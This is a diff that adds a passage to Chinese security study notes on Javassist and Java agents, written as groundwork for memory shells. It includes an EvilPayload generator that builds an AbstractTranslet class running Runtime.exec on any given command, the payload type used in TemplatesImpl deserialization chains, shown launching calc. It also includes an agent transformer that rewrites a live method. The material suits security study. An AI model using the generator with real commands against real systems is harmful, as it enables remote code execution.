@@ -292,6 +292,319 @@ public interface ClassFileTransformer {
 Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。
 
 ####  ClassPool
+`ClassPool`是`CtClass`对象的容器。`CtClass`对象必须从该对象获得。如果`get()`在此对象上调用，则它将搜索表示的各种源`ClassPath` 以查找类文件，然后创建一个`CtClass`表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放`CtClass`对象的容器。
+
+获得方法： `ClassPool cp = ClassPool.getDefault();`。通过 `ClassPool.getDefault()` 获取的 `ClassPool` 使用 JVM 的类搜索路径。**如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类**，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，**ClassPool 必须添加额外的类搜索路径**。
+
+`cp.insertClassPath(new ClassClassPath(<Class>));`
+#### CtClass
+可以将其理解为加强版的Class对象，我们可以通过CtClass对目标进行各种操作。可以 `ClassPool.get(ClassName)`中获取。
+#### CtMethod
+同理，可以理解成加强版的`Method`对象。可通过`CtClass.getDeclaredMethod(MethodName)`获取，该类提供了一些方法以便我们能够直接修改方法体、
+```java
+public final class CtMethod extends CtBehavior {
+    // 主要的内容都在父类 CtBehavior 中
+}
+ 
+// 父类 CtBehavior
+public abstract class CtBehavior extends CtMember {
+    // 设置方法体
+    public void setBody(String src);
+ 
+    // 插入在方法体最前面
+    public void insertBefore(String src);
+ 
+    // 插入在方法体最后面
+    public void insertAfter(String src);
+ 
+    // 在方法体的某一行插入内容
+    public int insertAt(int lineNum, String src);
+ 
+}
+```
+传递给方法 `insertBefore()` ，`insertAfter()` 和 `insertAt()` 的 String 对象**是由`Javassist` 的编译器编译的**。 由于编译器支持语言扩展，以 $ 开头的几个标识符有特殊的含义：
+![](picture/Pasted%20image%2020260112001402.png)
+#### 例子
+pom.xml
+```xml
+<dependency>  
+  <groupId>org.javassist</groupId>  
+  <artifactId>javassist</artifactId>  
+  <version>3.27.0-GA</version>  
+</dependency>
+```
+创建测试类
+```java
+package javassist;
+
+import java.lang.reflect.Modifier;
+
+public class Javassist_Test {
+    public static void Create_Person() throws Exception {
+
+        //获取 CtClass 对象的容器 ClassPool
+        ClassPool classPool = ClassPool.getDefault();
+
+        //创建一个新类 Javassist.Learning.Person
+        CtClass ctClass = classPool.makeClass("javassist.Person");
+
+        //创建一个类属性 name
+        CtField ctField1 = new CtField(classPool.get("java.lang.String"), "name", ctClass);
+        //设置属性访问符
+        ctField1.setModifiers(Modifier.PRIVATE);
+        //将 name 属性添加进 Person 中，并设置初始值为 Po1nt
+        ctClass.addField(ctField1, CtField.Initializer.constant("Po1nt"));
+
+        //向 Person 类中添加 setter 和 getter
+        ctClass.addMethod(CtNewMethod.setter("setName", ctField1));
+        ctClass.addMethod(CtNewMethod.getter("getName", ctField1));
+
+        //创建一个无参构造
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+        //设置方法体
+        ctConstructor.setBody("{name = \"Po1nt\";}");
+        //向Person类中添加无参构造
+        ctClass.addConstructor(ctConstructor);
+
+        //创建一个类方法printName
+        CtMethod ctMethod = new CtMethod(CtClass.voidType,"printName", new CtClass[]{}, ctClass);
+        //设置方法访问符
+        ctMethod.setModifiers(Modifier.PRIVATE);
+        //设置方法体
+        ctMethod.setBody("{System.out.println(name);}");
+        //将该方法添加进Person中
+        ctClass.addMethod(ctMethod);
+
+        //将生成的字节码写入文件
+        ctClass.writeFile("E:\\Coding\\Java\\Java-Agent-Memshell\\Instrumentation\\src\\main\\java");
+    }
+
+    public static void main(String[] args) throws Exception {
+        Create_Person();
+    }
+
+}
+
+```
+生成的 Person.class 如下
+```java
+//
+// Source code recreated from a .class file by IntelliJ IDEA
+// (powered by FernFlower decompiler)
+//
+
+package javassist;
+
+public class Person {
+    private String name = "Po1nt";
+
+    public void setName(String var1) {
+        this.name = var1;
+    }
+
+    public String getName() {
+        return this.name;
+    }
+
+    public Person() {
+        this.name = "Po1nt";
+    }
+
+    private void printName() {
+        System.out.println(this.name);
+    }
+}
+
+```
+由此延展的攻击面其实是，我们可以利用 Javassist 生成一个恶意的 `.class` 类，其实在 CC 链的时候也是可以这样子打的，但是我当时并没有学习 Javassist 的思路，只是通过 Path.get 获取恶意类。
+#### 使用 Javassist 生成恶意 class
+
+我们的恶意类需要继承`AbstractTranslet`类，并重写两个`transform()`方法。否则编译无法通过，无法生成`.class`文件。
+```java
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+ 
+public class shell extends AbstractTranslet {
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+    }
+ 
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+    }
+ 
+    public shell() throws IOException {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (Exception var2) {
+            var2.printStackTrace();
+        }
+    }
+}
+```
+但是该恶意类在执行过程中并没有用到重写的方法，所以我们可以直接使用Javassist从字节码层面来生成恶意class，跳过恶意类的编译过程。代码如下。
+```java
+package javassist;  
+  
+import java.io.File;  
+import java.io.FileOutputStream;  
+  
+public class EvilPayload {  
+  
+    public static byte[] getTemplatesImpl(String cmd) {  
+        try {  
+            ClassPool pool = ClassPool.getDefault();  
+            CtClass ctClass = pool.makeClass("Evil");  
+            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");  
+            ctClass.setSuperclass(superClass);  
+            CtConstructor constructor = ctClass.makeClassInitializer();  
+            constructor.setBody(" try {\n" +  
+                    " Runtime.getRuntime().exec(\"" + cmd +  
+                    "\");\n" +  
+                    " } catch (Exception ignored) {\n" +  
+                    " }");  
+            byte[] bytes = ctClass.toBytecode();  
+            ctClass.defrost();  
+            return bytes;  
+        } catch (Exception e) {  
+            e.printStackTrace();  
+            return new byte[]{};  
+        }  
+    }  
+  
+  
+    public static void writeShell() throws Exception {  
+        byte[] shell = EvilPayload.getTemplatesImpl("Calc");  
+        FileOutputStream fileOutputStream = new FileOutputStream(new File("S"));  
+        fileOutputStream.write(shell);  
+    }  
+  
+    public static void main(String[] args) throws Exception {  
+        writeShell();  
+    }  
+}
+```
+
+生成的恶意文件被我们输出到了 `S` 这个文件中，其实很多反序列化在用的时候，是没有把这个字节码提取保存出来，本质上还是可以保存的。
+保存出来的文件代码如下
+```java
+//  
+// Source code recreated from a .class file by IntelliJ IDEA  
+// (powered by FernFlower decompiler)  
+//  
+  
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  
+  
+public class Evil extends AbstractTranslet {  
+    static {  
+        try {  
+            Runtime.getRuntime().exec("Calc");  
+        } catch (Exception var1) {  
+        }  
+  
+    }  
+  
+    public Evil() {  
+    }  
+}
+```
+
+### 修改JVM 的Class字节码
+首先编写一个目标类 `com.sleep.hello.Sleep_Hello.java`
+```java
+package com.sleep.hello;
+ 
+import static java.lang.Thread.sleep;
+ 
+public class Sleep_Hello {
+    public static void main(String[] args) throws InterruptedException {
+        while (true){
+            hello();
+            sleep(3000);
+        }
+    }
+ 
+    public static void hello(){
+        System.out.println("Hello World!");
+    }
+}
+```
+编写一个agentmain-Agent
+```java
+package com.java.agentmain.instrumentation.transformer;
+ 
+import java.lang.instrument.Instrumentation;
+import java.lang.instrument.UnmodifiableClassException;
+ 
+public class Java_Agent_agentmain_transform {
+    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
+        Class [] classes = inst.getAllLoadedClasses();
+ 
+        //获取目标JVM加载的全部类
+        for(Class cls : classes){
+            if (cls.getName().equals("com.sleep.hello.Sleep_Hello")){
+ 
+                //添加一个transformer到Instrumentation，并重新触发目标类加载
+                inst.addTransformer(new Hello_Transform(),true);
+                inst.retransformClasses(cls);
+            }
+        }
+    }
+}
+
+```
+继承`ClassFileTransformer`类编写一个transformer，修改对应类的字节码
+```java
+
+package com.java.agentmain.instrumentation.transformer;
+ 
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
+ 
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.IllegalClassFormatException;
+import java.security.ProtectionDomain;
+ 
+public class Hello_Transform implements ClassFileTransformer {
+    @Override
+    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
+        try {
+ 
+            //获取CtClass 对象的容器 ClassPool
+            ClassPool classPool = ClassPool.getDefault();
+ 
+            //添加额外的类搜索路径
+            if (classBeingRedefined != null) {
+                ClassClassPath ccp = new ClassClassPath(classBeingRedefined);
+                classPool.insertClassPath(ccp);
+            }
+ 
+            //获取目标类
+            CtClass ctClass = classPool.get("com.sleep.hello.Sleep_Hello");
+ 
+            //获取目标方法
+            CtMethod ctMethod = ctClass.getDeclaredMethod("hello");
+ 
+            //设置方法体
+            String body = "{System.out.println(\"Hacked by Po1nt!\");}";
+            ctMethod.setBody(body);
+ 
+            //返回目标类字节码
+            byte[] bytes = ctClass.toBytecode();
+            return bytes;
+ 
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return null;
+    }
+}
+```
+
 
 
 
